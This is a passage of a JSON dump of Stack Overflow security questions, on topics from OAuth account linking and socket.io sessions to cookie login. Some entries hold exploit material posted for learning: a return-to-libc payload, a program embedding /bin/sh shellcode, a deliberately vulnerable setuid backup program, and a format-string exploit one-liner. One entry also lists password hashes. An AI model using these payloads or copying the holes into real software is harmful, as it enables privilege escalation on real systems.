foo@bar.com. This have some security implications.</p>\n\n<p>B. Ask for a password [assuming there is a password in the system, this may not be the case with multiple OAuth providers] and sign them into existing account if it's valid.</p>\n\n<p>C. Reject the login/signup, say email is already used, encourage user to login before connecting with Google.</p>\n\n<p><strong>What are the security risks with option #A?</strong></p>\n\n<p><em>What I've come up with myself:</em></p>\n\n<p>'Anticipation attacks' could be performed, where an attacker anticipates a signup and creates an account on the system before the target does. After the target has signed up using OAuth he will have an active session on that account. Would be defeated by clearing all sessions on the account before doing #A.</p>\n"},{"tags":["php","security","node.js","authentication","socket.io"],"answer_count":2,"favorite_count":3,"up_vote_count":6,"down_vote_count":0,"view_count":403,"score":6,"question_id":12192957,"title":"PHP + socket.io (session, authorizing and security problems)","body":"<p>I have a working php application in which I want to add real-time support. I would like to use nodejs/socket.io to add that kind of functionality. \n<br/><br/>\nFirst problem I found was how to properly authorize user on nodejs side (user is already authenticated on php backend through PHP session). Using <strong>socket.handshake.header.cookie</strong> on nodejs side i can parse and get PHP session id, which I can authenticate through redis/memcache/database (depending on what have I used to save session information).<br/> Everything looks cool when user has only one tab/window of the site opened - when having more and using <strong>session_regenerate_id()</strong>, in nodejs the user authenticates with another sessionid key, so I cannot distinguish two tabs by anything other than the socket id they connected with. When user logouts he shouldn't be getting any messages on any tab (because he already logged out on every tab/window from that browser). So on logout message (sent from browser just before the logout PHP things) I should remove all the socket connections connected to the authorized user id. But what if user logges in on two devices (fe. pc browser and an ipad safaris). After logout on one device, he shouldn't be getting any messages on the device he logged out, not on every device. <strong>How can i distinguish connections from different devices/browsers in socket.io?</strong> Of course not using <strong>session_regenerate_id()</strong> would be efficent here, but what can I do if I really want to use this feature?\n<br/><br/>\nAnother problem I have is rather a security issue (or even question). Let's assume that authorized user in application can see page <strong>example.com/user1</strong> (which is a news feed for user1) and cannot see <strong>example.com/user2</strong> (fe. he doesn't have rights to see it). I'd like socket.io to send update messages to browser when user is on <strong>example.com/user1</strong>, and of course not to send when user is on <strong>example.com/user2</strong> site. On socket.io side I can read the referer address (so presumably, when user is on user2 site he does not get any socket.io connection). The question is: <strong>should I compare the referer address with the rights of authenticated user on node.js side? Or maybe the referer value is <em>safe</em> on the node.js side?</strong> Adding another db check on node.js side would slow it down (because almost every request there should be same database check on two sides - PHP and node.js).\n<br/><br/>\nOr maybe the whole concept of socket.io + PHP application working the way I presented is wrong? </p>\n\n<p><strong>UPDATE</strong>\n<br/><br/>\nI think I found a way to omit problems with the first question - basically I just add another cookie (besides PHPSESSID) fe. named NODESESSID, which I generate (fe. using uniqid()) when user is authorized. Now authorization on node.js side is comparing PHPSESSID and NODESESSID (both must match). Now, when user logges out he delivers the message <em>logout</em> to socket.io and socket.io disconnects all the sockets with NODESESSID. This is like connecting the benefits of regenerating session id and not regenerating session id (but is not vulnerable to session fixation, isn't it?). </p>\n"},{"tags":["c","security","buffer-overflow","libc"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12340262,"title":"(Another) Return to Libc Attack: Won't Segfault or Return to Libc With Malicious Input. Works in GDB though","body":"<p>I'd like to learn how return to libc attacks work, so I have written a vulnerable program so that I can change the return address of a function to that of <code>system()</code>. However, the program doesn't appear to call <code>system()</code> and exits cleanly.</p>\n\n<h2>Prerequisites</h2>\n\n<p><strong>-</strong> I'm using Debain Squeeze</p>\n\n<p><strong>-</strong> I have disabled address randomization with:</p>\n\n<pre><code>echo 0 &gt; /proc/sys/kernel/randomize_va_space\n</code></pre>\n\n<h2>Vulnerable Code</h2>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nvoid someFunc(void);\n\nvoid someFunc(void){\n    char buffer[64];\n\n    gets(buffer);\n    //puts(buffer);\n}\n\nint main(int argc, char **argv)\n{\n    someFunc();\n    return 0;\n}\n</code></pre>\n\n<p>The code is compiled with:</p>\n\n<pre><code>gcc -fno-stack-protector -ggdb -o vuln vuln.c\n</code></pre>\n\n<p>Using GDB I have asserted that:</p>\n\n<ol>\n<li><code>/bin/zsh</code> is @ <code>0xbffff9b9</code></li>\n<li><code>system()</code> is @ <code>0xb7ed0000</code></li>\n<li><code>exit()</code> is @ <code>0xb7ec60f0</code></li>\n</ol>\n\n<h2>Exploit</h2>\n\n<p>I exploit it by piping in <code>72</code> zeros, exit, system and the pointer to <code>/bin/zsh</code>, in that order:</p>\n\n<pre><code>printf \"%072x\\xf0\\x60\\xec\\xb7\\x00\\x00\\xed\\xb7\\xb9\\xf9\\xff\\xbf\" | ./vuln\n</code></pre>\n\n<p>The program doesn't segfault or execute <code>/bin/zsh</code>.</p>\n\n<h2>In GDB</h2>\n\n<p>Interestingly, if I change <code>SHELL=\"/xin/zsh\"</code>, and execute it in gdb, the system call works:</p>\n\n<pre><code>Cannot exec /xin/zsh\n</code></pre>\n\n<p>So my questions are:</p>\n\n<ol>\n<li><p>Have I understood the return to libc attack concept correctly?</p></li>\n<li><p>Am I piping the malicious code in the correct way and order?</p></li>\n<li><p>Why does it appear to work in GDB, but not in the shell? <br>\n(I've already read <a href=\"http://stackoverflow.com/questions/4177996/return-to-libc-works-in-gdb-but-not-when-running-alone\">return to libc works in gdb but not when running alone</a>)</p></li>\n</ol>\n"},{"tags":["php","security","function","include"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12684070,"title":"Central PHP functions file without printing code on front end","body":"<p>I'm working on building a very large, very complex website and have PHP functions all over the place. Many of them are reused, and it's a very inefficient way of doing things, I know.</p>\n\n<p>I would like to use a central functions.php file, similar to how WordPress utilizes a central functions.php file. The fast &amp; easy solution would be to simply include the file using PHP include. However, the goal is to place the code behind the veil, making the PHP functions inaccessible to view on the front end. So a PHP include (the only solution I've found anywhere, which frightens me), will not work.</p>\n\n<p>In WordPress, when I call a function defined in the central functions.php file, it works, but the functions are not printed in the code on the front end of the site, as they are when I use a simple PHP include.</p>\n\n<p>How can I accomplish this? Can't seem to find a straightforward answer anywhere. Thanks in advance for any direction on this issue.</p>\n"},{"tags":["php","ajax","json","security"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":69,"score":2,"question_id":12680663,"title":"Ajax post request security","body":"<p>I am developing a mobile application using PhoneGap which will communicate with a server(PHP) via ajax requests.</p>\n\n<p>On the server side(PHP)\nSomething like <a href=\"https://example.com/retrieveData.php\" rel=\"nofollow\">https://example.com/retrieveData.php</a>\nwill get the user id via <code>$_POST['user_id']</code> and return some sensitive information about the user as JSON.</p>\n\n<p>And on the client side(PhoneGap-Javascript) \nthat JSON output will be parsed and will be used in the application.</p>\n\n<p>My concern is that if someone steals this url ( <a href=\"https://example.com/retrieveData.php\" rel=\"nofollow\">https://example.com/retrieveData.php</a> ), he can manually send fake post requests and can steal the returned user information?</p>\n\n<p>How can I secure this communication?</p>\n"},{"tags":["security","varnish"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":12680408,"title":"Varnish Security","body":"<p>Varnish security <strong>main.vcl</strong> contains</p>\n\n<pre><code># clear all internal variables\ninclude \"/etc/varnish/security/build/variables.vcl\";\n</code></pre>\n\n<p>and </p>\n\n<pre><code># fallthrough: clear all internal variables on security.vcl_recv exit\ninclude \"/etc/varnish/security/build/variables.vcl\";\n</code></pre>\n\n<p>but <strong>/etc/varnish/security/build/variables.vcl</strong> is not included into the git. \nI commented it out, and it is working fine but where can I get <strong>/etc/varnish/security/build/variables.vcl</strong>? <br />\nThanks!</p>\n"},{"tags":["php","security","session"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":108,"score":0,"question_id":12555761,"title":"session_regenerate_id(): Session object destruction failed, when running site via security scanners?","body":"<p>Is this normal, as I have tried two different scanners and they both seem to produce the same errors, so I'm assuming maybe it has to do with the way scanners work - as I don't get these errors when viewing the site normally (the site also functions fine - as expected).</p>\n\n<p>Ofcourse, I could just ignore it and clear the error log (when I've finished scanning my site), but I'm just curious and would like to know why (and if there is a 'fix')?</p>\n\n<p>FYI:</p>\n\n<ul>\n<li><p>When the site is being scanned; I get the same error repeatedly (on pages where <code>session_regenerate_id(true)</code> is included).</p></li>\n<li><p>The scanners which I have tried are both free Firefox Add-ons; 'SQL Inject Me' (by Security Compass) and Websecurify.</p></li>\n<li><p>I'm running these tests on my site (via 'localhost').</p></li>\n<li><p>The sessions are file based.</p></li>\n</ul>\n"},{"tags":["c","security","buffer-overflow"],"answer_count":4,"favorite_count":3,"up_vote_count":6,"down_vote_count":2,"view_count":1231,"score":4,"question_id":4733169,"title":"Exploit a backup program using C","body":"<p>I'm doing an assignment of a security course that asks me to find 4 vulnerabilities of a backup program (setuid) and use each of them to gain root access (on a virtual linux machine with old version of gcc etc.).\nThere should be one of buffer overflow and one of format string. </p>\n\n<p>Could anyone help me to point out where the 4 vulnerabilities are?\nI think the buffer overflow can happened in <code>copyFile()</code>.</p>\n\n<p>The following is the code for backup.c: (which can be invoked in \"backup backup foo\" or \"backup restore foo\")</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/wait.h&gt;\n#include &lt;string.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;sys/stat.h&gt;\n\n#define CMD_BACKUP 0\n#define CMD_RESTORE 1\n\n#define BACKUP_DIRECTORY \"/usr/share/backup\"\n#define FORBIDDEN_DIRECTORY \"/etc\"\n\nstatic\nint copyFile(char* src, char* dst)\n{\n  char buffer[3072]; /* 3K ought to be enough for anyone*/\n  unsigned int i, len;\n  FILE *source, *dest;\n  int c;\n\n  source = fopen(src, \"r\");\n  if (source == NULL) {\n    fprintf(stderr, \"Failed to open source file\\n\");\n    return -1;\n  }\n\n  i = 0;\n  c = fgetc(source);\n  while (c != EOF) {\n    buffer[i]  = (unsigned char) c;\n    c = fgetc(source);\n    i++;\n  }\n\n  len = i;\n  fclose(source);\n\n  dest = fopen(dst, \"w\");\n  if (dest == NULL) {\n    fprintf(stderr, \"Failed to open destination file\\n\");\n    return -1;\n  }\n\n  for(i = 0; i &lt; len; i++) \n    fputc(buffer[i], dest);\n\n  fclose(dest);\n\n  return 0;\n}\n\nstatic\nint restorePermissions(char* target)\n{\n  pid_t pid;\n  int status;\n  char *user, *userid, *ptr;\n  FILE *file;\n  char buffer[64];\n  mode_t mode;\n\n  // execute \"chown\" to assign file ownership to user\n  pid = fork();\n\n  // error\n  if (pid &lt; 0) {\n    fprintf(stderr, \"Fork failed\\n\");\n    return -1;\n  }\n\n  // parent\n  if (pid &gt; 0) {\n    waitpid(pid, &amp;status, 0);\n    if (WIFEXITED(status) == 0 || WEXITSTATUS(status) &lt; 0)\n      return -1;\n  }\n  else {\n\n    // child\n    // retrieve username\n    user = getenv(\"USER\");\n    // retrieve corresponding userid   \n    file = fopen(\"/etc/passwd\", \"r\");\n    if (file == NULL) {\n      fprintf(stderr, \"Failed to open password file\\n\");\n      return -1;\n    }\n    userid = NULL;\n    while (!feof(file)) {\n      if (fgets(buffer, sizeof(buffer), file) != NULL) {\n    ptr = strtok(buffer, \":\");\n    if (strcmp(ptr, user) == 0) {\n      strtok(NULL, \":\"); // password\n      userid = strtok(NULL, \":\"); // userid\n      ptr = strtok(NULL, \":\"); // group\n      *ptr = '\\0';\n      break;\n    }\n      }\n    }\n\n    if (userid != NULL) \n      execlp(\"/bin/chown\", \"/bin/chown\", userid, target, NULL);\n\n    // reached only in case of error\n    return -1;\n  }  \n\n  mode = S_IRUSR | S_IWUSR | S_IEXEC;\n  chmod(target, mode);\n\n  return 0;\n}\n\nstatic\nvoid usage(char* parameter) \n{\n  char newline = '\\n';\n  char output[96];\n  char buffer[96];\n\n  snprintf(buffer, sizeof(buffer),\n        \"Usage: %.60s backup|restore pathname%c\", parameter, newline);\n\n  sprintf(output, buffer);\n  printf(output);\n}\n\nint main(int argc, char* argv[]) \n{\n  int cmd;\n  char *path, *ptr;\n  char *forbidden = FORBIDDEN_DIRECTORY;\n  char *src, *dst, *buffer;\n  struct stat buf;\n\n  if (argc != 3) {\n    usage(argv[0]);\n    return 1;\n  }\n\n  if (strcmp(\"backup\", argv[1]) == 0) {\n    cmd = CMD_BACKUP;\n  }\n  else if (strcmp(\"restore\", argv[1]) == 0) {\n    cmd = CMD_RESTORE;\n  } else {\n    usage(argv[0]);\n    return 1;\n  }\n\n  path = argv[2];\n\n  // prevent access to forbidden directory\n  ptr = realpath(path, NULL);\n  if (ptr != NULL &amp;&amp; strstr(ptr, forbidden) == ptr) {\n    fprintf(stderr, \"Not allowed to access target/source %s\\n\", path);\n    return 1;\n  }\n\n  // set up paths for copy operation\n  buffer = malloc(strlen(BACKUP_DIRECTORY) + 1 + strlen(path) + 1);\n  if (buffer == NULL) {\n    fprintf(stderr, \"Failed to allocate memory\\n\");\n    return 1;\n  }\n\n  if (cmd == CMD_BACKUP) {\n    src = path;\n\n    dst = buffer;\n    strcpy(dst, BACKUP_DIRECTORY);\n    strcat(dst, \"/\");\n    strcat(dst, path);\n  }\n  else {\n    src = buffer;\n    strcpy(src, BACKUP_DIRECTORY);\n    strcat(src, \"/\");\n    strcat(src, path);\n\n    dst = path;\n\n    // don't overwrite existing file if we don't own it\n    if (stat(dst, &amp;buf) == 0 &amp;&amp; buf.st_uid != getuid()) {\n      fprintf(stderr, \"Not your file: %s\\n\", dst);\n      return 1;\n    }\n  }\n\n  // perform actual backup/restore operation\n  if (copyFile(src, dst) &lt; 0)\n    return 1;\n\n  // grant user access to restored file\n  if (cmd == CMD_RESTORE) {\n    if (restorePermissions(path) &lt; 0)\n      return 1;\n  }\n\n  return 0;\n}\n</code></pre>\n\n<p>And something useful:</p>\n\n<pre><code>  // one way to invoke backup\n  //system(\"/usr/local/bin/backup backup foo\");\n\n  // another way\n  args[0] = TARGET; args[1] = \"backup\"; \n  args[2] = \"foo\"; args[3] = NULL;\n\n  env[0] = NULL;\n  if (execve(TARGET, args, env) &lt; 0)\n    fprintf(stderr, \"execve failed.\\n\");\n  exit(0);\n</code></pre>\n"},{"tags":["security",".htaccess","authentication",".htpasswd"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":199,"score":0,"question_id":3936788,"title":"htaccess & htpasswd not hooking up correctly","body":"<p>Every time I try to go to <a href=\"http://www.public.asu.edu/~rlpeck/CSE465a/art.htm\" rel=\"nofollow\">Art School</a> on  <a href=\"http://www.public.asu.edu/~rlpeck/\" rel=\"nofollow\">Home Page</a> and put it the correct username/password I get a server error. Yes this is homework, and yes it is my first time doing anything related to this type of setup so any help would be appreciated. All the various instructions that I found listed this as the correct way so I'm sort of stuck.</p>\n\n<p>.htpasswd file(<code>/afs/asu.edu/users/r/l/p/rlpeck/pwd/.htpasswd</code>):</p>\n\n<pre><code>Alice:$apr1$sgDEa/..$FBtlSGHkbPHmlW80Sj2Sx1\nBob:$apr1$V8LLa/..$iX.YVKHoDfKyTKEMvuX.g/\nChris:$apr1$XuHOa/..$o6bf/JyA1otkH0jor4n5c/\nDave:$apr1$hpjQa/..$u3/D.f0xdN23Flg35qp9g.\nEve:$apr1$JIGSa/..$uTs55qYH1.gtDV7WZ0X7q0\n</code></pre>\n\n<p>.htaccess file(<code>/afs/asu.edu/users/r/l/p/rlpeck/www/CSE465a</code>):</p>\n\n<pre><code>AuthType Basic\nAuthName \"Restricted Area\"\nAuthUserFile /afs/asu.edu/users/r/l/p/rlpeck/pwd/.htpasswd\nAuthGroupFile /dev/null\nRequire valid-user\n</code></pre>\n\n<p><img src=\"http://i.stack.imgur.com/ooIf2.pngBlockquote\" alt=\"Server Error\"></p>\n\n<p>When I do run  <code>locate -r error.log</code> all I get are these:</p>\n\n<pre><code>/opt/tivoli/tsm/client/ba/bin/dsmerror.log\n/usr/share/doc/cups-1.2.4/de/images/button-view-error-log.gif\n/usr/share/doc/cups-1.2.4/es/images/button-view-error-log.gif\n/usr/share/doc/cups-1.2.4/help/ref-error_log.html\n/usr/share/doc/cups-1.2.4/images/button-view-error-log.gif\n/usr/share/doc/cups-1.2.4/ja/images/button-view-error-log.gif\n/usr/share/doc/cups-1.2.4/pl/images/button-view-error-log.gif\n/usr/share/doc/cups-1.2.4/sv/images/button-view-error-log.gif\n/var/log/cups/error_log\n/var/log/cups/error_log.1\n/var/log/cups/error_log.2\n</code></pre>\n\n<p>Edit: Response from help desk:</p>\n\n<blockquote>\n  <p>If you were testing the security of your page, you passed. I dont see an error</p>\n</blockquote>\n"},{"tags":["c","security","ip","packet-sniffers","packet-injection"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":102,"score":1,"question_id":2407616,"title":"Inject a packet to terminate a TCP connection","body":"<p>I have to write a program that sniffs network packets (part1-the simple part).<br>\nAnd I have to update the program (part2) so that it will be able to terminate connections.<br>\nThe specific requirements are:</p>\n\n<blockquote>\n  <p>Construct raw packets by specifying data link layer and network layer information including appropriate source and destination MAC and IP addresses. These packets are intended to terminate the connection. To do so, you should used SOCK_RAW as the  socket type to be able to set the header information by yourself.  </p>\n</blockquote>\n\n<p>Can anybody give me some ideas on the second part?<br>\nShould I hijack the session, apply a DoS attack on one of the users?</p>\n\n<p>All I need is some tips of how to terminate the connection.\nI am using the C programming language, and this is a course assignment for the security course.</p>\n"},{"tags":["c","security","buffer-overflow"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":107,"score":2,"question_id":10540094,"title":"Testing buffer overflow","body":"<p>I've been given a C code file where given the right input a buffer overflow occurs and then root access is granted. This is a Fedora bug using ZShell. In order to test this (security subject) we disabled the random memory address assignment that is enabled in the Linux kernel.</p>\n\n<p>I'm asked to test different inputs until a segmention fault happens, where the input is  the buffer size. What I don't get is, why should I test with different values? I'm not sure the code will help but I just dont get the point of varying the input.</p>\n\n<pre><code>/* vulnerable.c */\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\nunsigned char buf[] =\n\"\\x31\\xc0\" /* xorl %eax,%eax */\n\"\\x50\" /* pushl %eax */\n\"\\x68\"\"//sh\" /* pushl $0x68732f2f */\n\"\\x68\"\"/bin\" /* pushl $0x6e69622f */\n\"\\x89\\xe3\" /* movl %esp,%ebx */\n\"\\x50\" /* pushl %eax */\n\"\\x53\" /* pushl %ebx */\n\"\\x89\\xe1\" /* movl %esp,%ecx */\n\"\\x99\" /* cdql */\n\"\\xb0\\x0b\" /* movb $0x0b,%al */\n\"\\xcd\\x80\" /* int $0x80 */\n;\n/* -------------------------------------------------- */\nvoid vuln(char * buf)\n{\n    char a[16] = { 0 };\n    strcpy(a, buf);\n}\nint main(int argc, char * argv[])\n{\n    int *ret;\n    if (argc != 2)\n    {\n        printf(\"Usage: %s &lt;input&gt;\\n\", argv[0]);\n        exit(1);\n    }\n    vuln(argv[1]);\n    printf(\"%p\\n\", buf);\n    return 0;\n}\n</code></pre>\n"},{"tags":["c","security","malloc"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":95,"score":0,"question_id":9162299,"title":"I'm trying to find the security holes in this C code for a queue","body":"<p>I know that there's something fishy about the <code>malloc</code> part, but I'm having trouble seeing what's unsafe about this:</p>\n\n<pre><code>//que structure\ntypedef struct queue{\n         int *que;  // the actual array of queue elements\n         int head;   // the head index in que of the queue\n         int count;  /// number of elements in queue\n         int size; // max number of elements in queue\n    } QUEUE;\n\n\nvoid qManage(QUEUE **qptr, int flag, int size){\n      if(flag){\n              /* allocate a new queue */\n              *qptr = malloc(sizeof(QUEUE));\n              (*qptr)-&gt;head = (*qptr)-&gt;count = 0;\n              (*qptr)-&gt;que = malloc(size * sizeof(int));\n              (*qptr)-&gt;size = size;\n    }\n    else{\n             /* delete the current queue */\n             (void) free((*qptr)-&gt;que);\n             (void) free(*qptr);\n    }\n}\n</code></pre>\n"},{"tags":["c","string","security","printf","format-string"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":250,"score":1,"question_id":7073151,"title":"Format String Attack in C","body":"<p>I'm studying a security unit and I'm attempting to understand format string attacks. Could somebody please attempt to explain this to me?</p>\n\n<p>The following code is taken from: <a href=\"http://julianor.tripod.com/bc/tn-usfs.pdf\" rel=\"nofollow\">http://julianor.tripod.com/bc/tn-usfs.pdf</a>:</p>\n\n<pre><code>/*\n * fmtme.c\n *       Format a value into a fixed-size buffer\n */\n#include &lt;stdio.h&gt;\nint\nmain(int argc, char **argv)\n{\n    char buf[100];\n    int x;\n    if(argc != 2)\n        exit(1);\n    x = 1;\n    snprintf(buf, sizeof buf, argv[1]);\n    buf[sizeof buf - 1] = 0;\n    printf(\"buffer (%d): %s\\n\", strlen(buf), buf);\n    printf(\"x is %d/%#x (@ %p)\\n\", x, x, &amp;x);\n    return 0;\n}\n</code></pre>\n\n<p>As I understand it, the <code>%n</code> format specifier is used to read a specified address back into memory, then when <code>printf</code> pops values off the stack, it should read our address. I can't seem to pull this off. </p>\n\n<p>In the document, the following example is provided:</p>\n\n<pre><code>perl -e 'system \"./fmtme\", \"\\x58\\x74\\x04\\x08%d%n\"'\n</code></pre>\n\n<p>Where did <code>\\x58\\x74\\x04\\x08%d%n</code> come from?</p>\n"},{"tags":["security","cryptography","cipher"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":166,"score":0,"question_id":5494120,"title":"What kind of cryptographic mechanism uses repeated xor's?","body":"<p>I'm attempting to analyze a short encryption program and figure out which mechanism it's using.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main( int argc, char * argv[] ) {\n    long int key;\n    char * endptr;\n\n    key = strtol( argv[1], &amp;endptr, 10 );\n\n    srandom( key );\n    { /* now copy input to output through crypt transformation */\n            char ch;\n            while (!feof( stdin )) {\n                    putc( (getc(stdin) ^ random())&amp;0xFF, stdout );\n            }\n            fclose( stdout );\n    }\n}\n</code></pre>\n\n<p>I can follow this simply, but I'm having trouble trying to weed out which mechanism it's using..</p>\n\n<p>I'm looking at the following:</p>\n\n<p><a href=\"http://en.wikipedia.org/wiki/Public-key_cryptography\" rel=\"nofollow\">http://en.wikipedia.org/wiki/Public-key_cryptography</a></p>\n\n<p><a href=\"http://en.wikipedia.org/wiki/Block_cipher\" rel=\"nofollow\">http://en.wikipedia.org/wiki/Block_cipher</a></p>\n\n<p><a href=\"http://en.wikipedia.org/wiki/Stream_cipher\" rel=\"nofollow\">http://en.wikipedia.org/wiki/Stream_cipher</a></p>\n\n<p><a href=\"http://en.wikipedia.org/wiki/Diffie-Hellman\" rel=\"nofollow\">http://en.wikipedia.org/wiki/Diffie-Hellman</a></p>\n\n<p>I'm leaning towards iterated block cyphers but I really have no idea at this point.</p>\n"},{"tags":["security","overflow","buffer"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":240,"score":0,"question_id":1973534,"title":"buffer overflow","body":"<p>How can a buffer overflow effect the OSI model? </p>\n\n<p>How many layers of the OSI model can be affected by an buffer overflow vulnerability.</p>\n"},{"tags":["linux","security","debugging","memory-management"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":131,"score":0,"question_id":1569633,"title":"Information about RAM management in OS Linux, protection programs","body":"<p>I'm writing a report and presentation for my college titled \"Protection runtime program in RAM. Examples of work with the protected program.\" I'm using Linux. </p>\n\n<p>I divided my report into two parts:</p>\n\n<ol>\n<li><p>Description of technology managed RAM OS Linux - Allocated memory for applications - Protection stack for one application from other applications.</p></li>\n<li><p>Protection runtime program from disassembler and debugger.</p></li>\n</ol>\n\n<p>What websites, article, books about this subjects do you recommend? </p>\n"},{"tags":["java","ftp","sftp","security"],"answer_count":12,"favorite_count":46,"up_vote_count":72,"down_vote_count":0,"view_count":74189,"score":72,"question_id":14617,"title":"Java: What is the best way to SFTP a file from a server","body":"<p>What is the best way to retrieve a file from a server using SFTP (as opposed to FTPS) using Java?\nI'll leave the particular definition of best up to you but in my mind it should include free :)</p>\n"},{"tags":["security","jsf"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":34,"score":1,"question_id":12672465,"title":"JSF (Container Managed Security) Group Roles","body":"<p>For a JSF application running on JBoss 4.2 with JSF 1.2, Container Managed Security and EJB 3.0 I'm looking for a solution to have several roles combined in one role. For example:</p>\n\n<ul>\n<li>Roles: IT-Support, Phone-Support, Technical-Support, Deliver-Support</li>\n</ul>\n\n<p>Now, I want to specify one role which includes for example three of these roles:</p>\n\n<ul>\n<li>Role: Senior-Suppoert (IT-Support, Technical-Support, Deliver-Support)</li>\n</ul>\n\n<p>Is this possible with the container managed security and Jboss?</p>\n"},{"tags":["linux","security"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12471861,"title":"Checking if linux running in normal mode","body":"<p>How can I check in my application that the system is running in normal mode, not booted with a bootable media, like CD-ROM or USB. What files, services, or any other thing need to be overlooked?</p>\n\n<p>This is really needed, as I need to achieve some level of security along with other measures and techniques that I use to secure my application. Any ideas?</p>\n\n<p>P.S. I use Ubuntu 12.4</p>\n"},{"tags":["javascript","security","cryptography","w3c"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":88,"score":2,"question_id":12588249,"title":"WebcryptoAPI - secure or not?","body":"<p>This is about the new W3 WebcryptoAPI draft standard - <a href=\"http://www.w3.org/2012/webcrypto/WebCryptoAPI/\" rel=\"nofollow\">http://www.w3.org/2012/webcrypto/WebCryptoAPI/</a></p>\n\n<p>Here is a post by one of it's authors</p>\n\n<p><a href=\"https://plus.google.com/u/0/105761279104103278252/posts/CSwVZ1RUijo\" rel=\"nofollow\">https://plus.google.com/u/0/105761279104103278252/posts/CSwVZ1RUijo</a></p>\n\n<p>It says its in part trying to change the \"Javascript Cryptography Considered Hamrful\" problem. However if you look at the \"Javascript Cryptography Considered Hamrful\" article -  <a href=\"http://www.matasano.com/articles/javascript-cryptography/\" rel=\"nofollow\">http://www.matasano.com/articles/javascript-cryptography/</a> - it seems as if most of the problems still remain unsolved. The only problem solved is that you won't have hand coded cryptographic functions in javascript - these will be provided by the browser. However, the remaining problems still remain.</p>\n\n<p>Your thoughts?</p>\n"},{"tags":["security","osx","keychain"],"answer_count":2,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":1287,"score":4,"question_id":1186385,"title":"Getting Attributes of Keychain Items","body":"<p>I'm trying to get the attributes of a keychain item. This code should look up all the available attributes, then print off their tags and contents.</p>\n\n<p>According to <a href=\"http://developer.apple.com/documentation/security/Reference/keychainservices/Reference/reference.html#//apple%5Fref/c/tdef/SecItemAttr\" rel=\"nofollow\">the docs</a> I should be seeing tags like 'cdat', but instead they just look like an index (i.e., the first tag is 0, next is 1). This makes it pretty useless since I can't tell which attribute is the one I'm looking for.</p>\n\n<pre><code>\tSecItemClass itemClass;\n\tSecKeychainItemCopyAttributesAndData(itemRef, NULL, &amp;itemClass, NULL, NULL, NULL);\n\n\tSecKeychainRef keychainRef;\n\tSecKeychainItemCopyKeychain(itemRef, &amp;keychainRef);\n\n\tSecKeychainAttributeInfo *attrInfo;\n\tSecKeychainAttributeInfoForItemID(keychainRef, itemClass, &amp;attrInfo);\n\n\tSecKeychainAttributeList *attributes;\n\tSecKeychainItemCopyAttributesAndData(itemRef, attrInfo, NULL, &amp;attributes, 0, NULL);\n\n\tfor (int i = 0; i &lt; attributes-&gt;count; i ++)\n\t{\n\t\tSecKeychainAttribute attr = attributes-&gt;attr[i];\n\t\tNSLog(@\"%08x %@\", attr.tag, [NSData dataWithBytes:attr.data length:attr.length]);\n\t}\n\n\tSecKeychainFreeAttributeInfo(attrInfo);\n\tSecKeychainItemFreeAttributesAndData(attributes, NULL);\n\tCFRelease(itemRef);\n\tCFRelease(keychainRef);\n</code></pre>\n"},{"tags":["java","security","cookies","login"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":58,"score":1,"question_id":12676106,"title":"Java web application secured authorization via cookies","body":"<p>I have a java servlet web application. In the application I have two authorization logics: \n1. Authorization via username and password - standart login via web form with username and password which user fills up.\n2. Authorization via cookies. Once, user fills up username and password, and checks a checkbox 'remember me', after this he shouldn't enters username/password. \nI have a question about option number two (cookies). At the moment logic is: I check if user checked 'remember me', I get his username and password hash, and store it to the cookies. (Two cookies: <strong>username</strong>, <strong>password</strong>) But, I think that the way is not secured. Because somebody can steal the cookies and get access to the web app. \nQuestion is: what is the best secured way to authorized user via cookies? What should I store in the cookeis?</p>\n"},{"tags":["security"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":8,"score":0,"question_id":12675899,"title":"How to use OVAL to find CVEs","body":"<p>I need a way of finding CVEs for specific platforms (and not just necessarily desktop OS platforms). Been checking out the CVE and NVD websites, saw something called OVAL. Any good?</p>\n\n<p>The idea is a user sets his operating system / software, along with its version number on my site, and I check against a vulnerability database to see if his current OS or software is vulnerable to attacks.\nDoes anyone have any experience in this?</p>\n"},{"tags":["javascript","security","internet-explorer","permission-denied"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":95,"score":0,"question_id":12673666,"title":"Permission Denied Error in IE While changing URL using Javascript","body":"<p>I am opening a popup window from main(parent) window and passing main windows cookie for session.</p>\n\n<p>Both window are different sites and I use cookie to share some information. That is main window from site www.site1.com and opening popup window of www.site-two.com.</p>\n\n<p>However if i logged out main (parent) window and cleared session cookie, then i refresh popup window in IE says, permission denied.</p>\n\n<p>But works fine in Firefox, Chrome.</p>\n\n<p>In 